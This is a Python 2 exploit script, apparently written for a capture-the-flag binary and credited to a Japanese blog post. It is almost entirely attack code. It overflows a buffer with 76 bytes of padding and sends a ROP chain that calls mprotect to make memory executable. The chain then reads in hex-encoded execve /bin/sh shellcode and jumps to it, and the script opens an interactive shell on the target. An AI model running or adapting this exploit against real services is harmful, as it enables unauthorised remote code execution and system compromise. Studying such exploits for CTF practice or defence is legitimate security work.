#!/usr/bin/python
# -*- coding: utf-8 -*-
# snip from http://rintaro.hateblo.jp/entry/2016/05/24/002700
import sys, socket, struct, telnetlib, time

###################### func ######################
def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	f = s.makefile("rw", bufsize=0)
	return s, f

def read_until(f, delim="\n"):
	data = ""
	while not data.endswith(delim):
		data += f.read(1)
	return data

def shell(s):
	t = telnetlib.Telnet()
	t.sock = s
        s.send('id\n')
	t.interact()

def p32(a): 
    return struct.pack("<I", a)

def p64(a): 
    return struct.pack("<Q", a)

###################### main ######################

RHOST = 'remote.host.addr'
LHOST = 'localhost'
PORT  = 31337

def main(argv):
	if(len(argv) == 2 and argv[1] == "r"):
		print "[+] connect to remote."
		s, f = sock(RHOST, PORT)
	else:
		print "[+] connect to local."
		s, f = sock(LHOST, PORT)
                raw_input('>>> ready to attach debugger ...')


	# shellcraft i386.linux.sh
	sc = "6a68682f2f2f73682f62696e89e331c96a0b5899cd80".decode('hex')

        data_addr          = 0x080eb060+100
	read_addr          = 0x0806dc40
	mprotect_addr      = 0x0806e7b0
        mprotect_data_addr = data_addr & 0xFFFFF000
        pppr = 0x0809dd55

        rop = ''
        # for adjusting ebp
	# ___mprotect(mprotect_data_addr, 0x1000, 7)
	rop += p32(mprotect_addr)     # mprotect 
	rop += p32(pppr)               # pop; pop; pop; ret
	rop += p32(mprotect_data_addr) # addr
	rop += p32(0x1000)             # size 
	rop += p32(7)                  # RWX for executing shellcode

	# ___libc_read(STDIN, data_addr, len(sc))
	rop += p32(read_addr)          # read
	rop += p32(pppr)               # pop; pop; pop; ret 
	rop += p32(0)                  # sock/file
	rop += p32(data_addr)          # place for saving shellcode
	rop += p32(len(sc))            # sizoef(shellcode)

        # run shellcode
	rop += p32(data_addr)          # run shellcode

	payload = 'A'* 76 + rop + '\n'
	f.write( payload )

	time.sleep(0.3)
	f.write(sc)

	print "[+] interact mode:"
	shell(s)

if __name__ == "__main__":
    if len(sys.argv) == 1:
	main('l')
    else:
	main(sys.argv)
